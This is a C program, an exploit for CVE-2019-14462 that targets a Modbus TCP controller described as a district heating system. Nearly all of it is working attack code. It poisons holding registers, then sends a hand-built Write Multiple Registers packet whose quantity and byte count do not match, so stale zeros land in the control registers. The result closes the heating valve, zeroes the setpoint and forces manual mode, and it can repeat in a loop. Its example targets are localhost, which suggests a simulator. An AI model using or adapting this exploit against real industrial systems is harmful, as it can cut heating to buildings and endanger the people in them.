/*
 * CVE-2019-14462 ICS Attack - Temperature Control Manipulation
 *
 * This demonstrates REAL-WORLD IMPACT by injecting valid control values:
 * 1. Poison buffer with "shutdown" values (valve=0, setpoint=0)
 * 2. Exploit stale data read to inject these values into control registers
 *
 * Result: PLC closes heating valve, temperature drops!
 *
 * Register Map:
 *   HR[0] = valve_cmd  (0-100%)    - Heating valve position
 *   HR[1] = setpoint   (0-400)     - Target temperature
 *   HR[2] = mode       (0=manual)  - Control mode
 */

#include <errno.h>
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

void print_usage(const char *prog) {
    printf("Usage: %s <IP> <PORT> [loops]\n", prog);
    printf("\n");
    printf("Arguments:\n");
    printf("  IP     Target IP address\n");
    printf("  PORT   Target port\n");
    printf("  loops  Number of attack iterations (default: 1)\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 5020       # Single attack\n", prog);
    printf("  %s 127.0.0.1 5020 10    # 10 attack iterations\n", prog);
}

const char* get_register_name(int idx) {
    switch(idx) {
        case 0: return "valve_cmd";
        case 1: return "setpoint";
        case 2: return "mode";
        case 3: return "temperature";
        case 4: return "valve_pos";
        case 5: return "sim_time";
        default: return "reserved";
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int loops = (argc > 3) ? atoi(argv[3]) : 1;

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2019-14462: ICS Temperature Control Attack          ║\n");
    printf("║  Target: District Heating Controller                     ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Attack loops: %d\n\n", loops);

    /* Connect */
    printf("[1] Connecting to PLC...\n");
    modbus_t *ctx = modbus_new_tcp(target_ip, target_port);
    if (!ctx) {
        fprintf(stderr, "    FAILED: modbus_new_tcp\n");
        return EXIT_FAILURE;
    }

    modbus_set_response_timeout(ctx, 5, 0);
    modbus_set_slave(ctx, 1);

    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Read initial state */
    printf("[2] Reading current PLC state...\n");
    uint16_t initial_regs[10];
    if (modbus_read_registers(ctx, 0, 10, initial_regs) != 10) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    printf("    ┌─────────────────────────────────────────┐\n");
    printf("    │ Register      Value   Description       │\n");
    printf("    ├─────────────────────────────────────────┤\n");
    for (int i = 0; i < 6; i++) {
        printf("    │ HR[%d] %-10s %5u", i, get_register_name(i), initial_regs[i]);
        if (i == 0) printf("%%  Valve opening     │\n");
        else if (i == 1) printf("°C Target temp       │\n");
        else if (i == 2) printf("   %s           │\n", initial_regs[i] ? "AUTO" : "MANUAL");
        else if (i == 3) printf("°C Current temp      │\n");
        else if (i == 4) printf("%%  Actual valve      │\n");
        else if (i == 5) printf("s  Simulation time   │\n");
    }
    printf("    └─────────────────────────────────────────┘\n\n");

    float initial_temp = initial_regs[3] / 10.0;
    printf("    Current temperature: %.1f°C\n\n", initial_temp);

    /*
     * ATTACK: Inject "shutdown" values via stale data
     *
     * Poison values (will become stale data for HR[2+]):
     *   - mode = 0 (manual mode - disable auto control)
     *   - All others = 0
     *
     * Explicit values in malicious packet (HR[0-1]):
     *   - valve_cmd = 0 (close valve completely)
     *   - setpoint = 0 (target temp = 0°C)
     */

    for (int loop = 0; loop < loops; loop++) {
        if (loops > 1) {
            printf("━━━ Attack iteration %d/%d ━━━\n\n", loop + 1, loops);
        }

        printf("[3] Poisoning buffer with shutdown values...\n");

        /* Poison values - these become stale data for HR[2+] */
        uint16_t poison_values[10] = {
            0,    /* HR[0] valve_cmd = 0% (will be overwritten by explicit) */
            0,    /* HR[1] setpoint = 0  (will be overwritten by explicit) */
            0,    /* HR[2] mode = 0 (MANUAL) <- STALE DATA TARGET */
            0,    /* HR[3] <- STALE (read-only in PLC, but we corrupt it) */
            0,    /* HR[4] <- STALE */
            0,    /* HR[5] <- STALE */
            0, 0, 0, 0
        };

        printf("    Poison: valve=0%%, setpoint=0, mode=MANUAL\n");

        int rc = modbus_write_registers(ctx, 0, 10, poison_values);
        if (rc != 10) {
            fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        } else {
            printf("    Buffer poisoned!\n");
        }
        printf("\n");

        /*
         * STEP 2: Malicious write with quantity/byte_count mismatch
         *
         * We send: quantity=10 registers, byte_count=4 bytes (only 2 regs)
         * Server reads:
         *   HR[0-1] = our explicit values (0, 0)
         *   HR[2-9] = STALE buffer data (all 0s from poison step)
         */
        printf("[4] Sending MALICIOUS packet...\n");
        printf("    Claimed: 10 registers\n");
        printf("    Actual:  4 bytes (2 registers)\n");
        printf("    Effect:  HR[2-9] get STALE shutdown values!\n");

        int sock = modbus_get_socket(ctx);
        uint8_t query[32];
        memset(query, 0, sizeof(query));

        /* MBAP Header */
        query[0] = 0x00; query[1] = (uint8_t)(loop + 2);  /* Transaction ID */
        query[2] = 0x00; query[3] = 0x00;  /* Protocol ID */
        query[4] = 0x00; query[5] = 0x0B;  /* Length: 11 bytes */
        query[6] = 0x01;                   /* Unit ID */

        /* PDU - Write Multiple Registers */
        query[7] = 0x10;                   /* FC: Write Multiple Registers */
        query[8] = 0x00; query[9] = 0x00;  /* Starting address: 0 */
        query[10] = 0x00; query[11] = 0x0A; /* Quantity: 10 registers */
        query[12] = 0x04;                  /* Byte count: only 4! MISMATCH! */

        /* Explicit values - shutdown commands */
        query[13] = 0x00; query[14] = 0x00;  /* HR[0] valve_cmd = 0% */
        query[15] = 0x00; query[16] = 0x00;  /* HR[1] setpoint = 0°C */

        if (send(sock, query, 17, 0) != 17) {
            fprintf(stderr, "    FAILED: send error\n");
        } else {
            printf("    Malicious packet sent!\n");
        }

        /* Wait for response */
        uint8_t response[32];
        struct timeval tv = {3, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        recv(sock, response, sizeof(response), 0);
        printf("\n");

        /* Reconnect and read results */
        modbus_close(ctx);
        usleep(100000);  /* 100ms delay */

        if (modbus_connect(ctx) == -1) {
            fprintf(stderr, "    Reconnect failed\n");
            modbus_free(ctx);
            return EXIT_FAILURE;
        }

        printf("[5] Reading PLC state after attack...\n");
        uint16_t final_regs[10];
        if (modbus_read_registers(ctx, 0, 10, final_regs) != 10) {
            fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        } else {
            printf("    ┌─────────────────────────────────────────────────┐\n");
            printf("    │ Register      Value   Status                    │\n");
            printf("    ├─────────────────────────────────────────────────┤\n");
            for (int i = 0; i < 6; i++) {
                printf("    │ HR[%d] %-10s %5u", i, get_register_name(i), final_regs[i]);

                if (i == 0) {
                    if (final_regs[i] == 0)
                        printf("%%  VALVE CLOSED!              │\n");
                    else
                        printf("%%                              │\n");
                } else if (i == 1) {
                    if (final_regs[i] == 0)
                        printf("°C SETPOINT ZEROED!            │\n");
                    else
                        printf("°C                             │\n");
                } else if (i == 2) {
                    if (final_regs[i] == 0)
                        printf("   FORCED TO MANUAL!           │\n");
                    else
                        printf("   AUTO                        │\n");
                } else if (i == 3) {
                    float temp = final_regs[i] / 10.0;
                    if (temp < initial_temp)
                        printf("°C DROPPING! (was %.1f)        │\n", initial_temp);
                    else
                        printf("°C                             │\n");
                } else if (i == 4) {
                    printf("%%                              │\n");
                } else if (i == 5) {
                    printf("s                              │\n");
                }
            }
            printf("    └─────────────────────────────────────────────────┘\n");
        }
        printf("\n");

        if (loop < loops - 1) {
            printf("    Waiting 2 seconds before next attack...\n\n");
            sleep(2);
        }
    }

    /* Final summary */
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  ATTACK RESULTS                                          ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  CVE-2019-14462 exploited successfully!                  ║\n");
    printf("║                                                          ║\n");
    printf("║  Impact on District Heating Controller:                  ║\n");
    printf("║  • Heating valve CLOSED (valve_cmd = 0%%)                 ║\n");
    printf("║  • Temperature setpoint ZEROED (setpoint = 0°C)          ║\n");
    printf("║  • Control mode forced to MANUAL                         ║\n");
    printf("║                                                          ║\n");
    printf("║  Physical consequence: Building loses heating!           ║\n");
    printf("║  Temperature will drop until intervention.               ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    modbus_close(ctx);
    modbus_free(ctx);
    return EXIT_SUCCESS;
}
